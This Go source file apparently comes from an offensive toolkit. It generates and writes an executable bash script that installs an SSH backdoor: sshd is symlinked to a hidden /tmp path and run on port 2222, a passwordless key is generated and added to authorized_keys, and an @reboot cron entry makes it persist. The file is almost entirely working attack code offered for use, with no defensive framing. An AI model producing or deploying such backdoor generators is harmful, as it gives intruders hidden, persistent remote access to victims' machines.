package ssh

import (
	"fmt"
	"os"
	"path/filepath"
	"text/template"
	"time"
)

type SSHBackdoor struct {
	Port     int
	LinkPath string
	KeyPath  string
}

func NewSSHBackdoor() *SSHBackdoor {
	return &SSHBackdoor{
		Port:     2222,
		LinkPath: "/tmp/.sshd",
		KeyPath:  "/tmp/.ssh_key",
	}
}

func (s *SSHBackdoor) GeneratePayload(outDir string) error {
	// 生成SSH后门脚本
	mainScript := `#!/bin/bash
# SSH Backdoor Generator
# Generated at: {{.Timestamp}}

SSH_PORT={{.Port}}
LINK_PATH="{{.LinkPath}}"
KEY_PATH="{{.KeyPath}}"

# Create SSH backdoor
ln -sf /usr/sbin/sshd $LINK_PATH
$LINK_PATH -oPort=$SSH_PORT

# Generate SSH key pair
ssh-keygen -t ed25519 -f $KEY_PATH -N ""
cat ${KEY_PATH}.pub >> ~/.ssh/authorized_keys

# Add persistence
CRON_CMD="@reboot $LINK_PATH -oPort=$SSH_PORT"
(crontab -l 2>/dev/null | grep -v "$LINK_PATH"; echo "$CRON_CMD") | crontab -

# Cleanup
echo "[+] SSH backdoor installed on port $SSH_PORT"
echo "[+] Private key saved to $KEY_PATH"
`

	scriptPath := filepath.Join(outDir, "ssh_backdoor.sh")
	return s.writeFile(scriptPath, mainScript, struct {
		Timestamp string
		Port      int
		LinkPath  string
		KeyPath   string
	}{
		Timestamp: time.Now().Format("2006-01-02 15:04:05"),
		Port:      s.Port,
		LinkPath:  s.LinkPath,
		KeyPath:   s.KeyPath,
	})
}

func (s *SSHBackdoor) writeFile(filepath string, content string, data interface{}) error {
	tmpl, err := template.New("ssh").Parse(content)
	if err != nil {
		return fmt.Errorf("failed to parse template: %v", err)
	}

	f, err := os.Create(filepath)
	if err != nil {
		return fmt.Errorf("failed to create file: %v", err)
	}
	defer f.Close()

	if err := tmpl.Execute(f, data); err != nil {
		return fmt.Errorf("failed to execute template: %v", err)
	}

	return os.Chmod(filepath, 0755)
}
